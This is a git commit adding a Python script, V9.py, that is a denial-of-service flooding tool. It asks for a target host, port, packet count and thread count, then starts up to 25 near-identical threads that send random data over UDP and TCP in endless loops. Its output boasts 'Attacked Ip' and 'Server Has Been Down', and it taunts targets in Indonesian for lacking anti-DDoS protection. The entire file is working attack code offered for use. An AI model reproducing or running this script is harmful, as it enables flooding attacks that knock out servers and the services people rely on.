ef1762e1c1c264fa71077ee1893b59a70d6d2a81
Alexxzz1 <108179991+Alexxzz1@users.noreply.github.com>
2022-07-13 05:48:31 +0700

    Add files via upload

---
+++ V9.py
@@ -0,0 +1,447 @@
+#Codes : ReXx
+#Mau Rename Dek? 
+import random
+import socket
+import threading
+import os
+import sys
+
+os.system("clear")
+print("""\033[95m
+
+▇◤▔▔▔▔▔▔▔◥▇
+▇▏◥▇◣┊◢▇◤▕▇
+▇▏▃▆▅▎▅▆▃▕▇
+▇▏╱▔▕▎▔▔╲▕▇
+▇◣◣▃▅▎▅▃◢◢▇
+▇▇◣◥▅▅▅◤◢▇▇
+▇▇▇◣╲▇╱◢▇▇▇ 
+By : ReXxV8""")
+
+ip = str(input(" Host Or Ip:"))
+port = int(input(" Port:"))
+choice = str(input(" Already Ready Attack?(y/n):"))
+times = int(input(" Package:"))
+threads = int(input(" Threads:"))
+def run():
+	data = random._urandom(20000)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print("[!] Offline!!!")
+
+def run2():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Offline")
+			
+def run3():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Offline")
+
+def run4():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Offline")
+
+def run5():
+	data = random._urandom(20000)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Offline")
+
+def run6():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Offline")
+
+def run7():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Offline")
+			
+def run8():
+    data = random._urandom(16)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("Server Has Been Down")
+            
+def run9():
+    data = random._urandom(20000)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("Server Has Been Down")  
+
+def run10():
+    data = random._urandom(1050)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("Server Has Been Down")
+
+def run11():
+    data = random._urandom(16)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("Server Has Been Down")
+def run12():
+    data = random._urandom(16)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("Server Has Been Down")
+def run13():
+    data = random._urandom(16)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("Server Has Been Down")
+
+def run14():
+    data = random._urandom(16)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("Server Has Been Down")
+
+def run15():
+	data = random._urandom(20000)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" REXX!!!")
+		except:
+			s.close()
+			print("[*] OFF NGETOD")
+
+def run16():
+    data = random._urandom(1050)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +" PAKET SICEPAT NII DEK!!!")
+        except:
+            s.close()
+            print("[WAAH] GAK PASANG ANTI DDOS KAH MANIEZ??")
+
+def run17():
+    data = random._urandom(818)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"Attacked Ip %s And Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("Server Has Been Down")
+
+def run18():
+	data = random._urandom(999)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+def run19():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+def run20():
+	data = random._urandom(818)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+def run21():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+def run22():
+	data = random._urandom(818)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+def run23():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+def run24():
+	data = random._urandom(818)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+def run25():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+for y in range(threads):
+    if choice == 'y':
+        th = threading.Thread(target = run)
+        th.start()
+        th = threading.Thread(target = run2)
+        th.start()
+        th = threading.Thread(target = run3)
+        th.start()
+        th = threading.Thread(target = run4)
+        th.start()
+        th = threading.Thread(target = run5)
+        th.start()
+        th = threading.Thread(target = run6)
+        th.start()
+        th = threading.Thread(target = run7)
+        th.start()
+        th = threading.Thread(target = run8)
+        th.start()
+        th = threading.Thread(target = run9)
+        th.start()
+        th = threading.Thread(target = run10)
+        th.start()
+        th = threading.Thread(target = run11)
+        th.start()
+        th = threading.Thread(target = run12)
+        th.start()
+        th = threading.Thread(target = run13)
+        th.start()
+else:
+        th = threading.Thread(target = run14)
+        th.start()
+        th = threading.Thread(target = run15)
+        th.start()
+        th = threading.Thread(target = run16)
+        th.start()
+        th = threading.Thread(target = run17)
+        th.start()
+        th = threading.Thread(target = run18)
+        th.start()
+        th = threading.Thread(target = run19)
+        th.start()
+        th = threading.Thread(target = run20)
+        th.start()
+        th = threading.Thread(target = run21)
+        th.start()
+        th = threading.Thread(target = run22)
+        th.start()
+        th = threading.Thread(target = run23)
+        th.start()
+        th = threading.Thread(target = run24)
+        th.start()
+        th = threading.Thread(target = run25)
+        th.start()
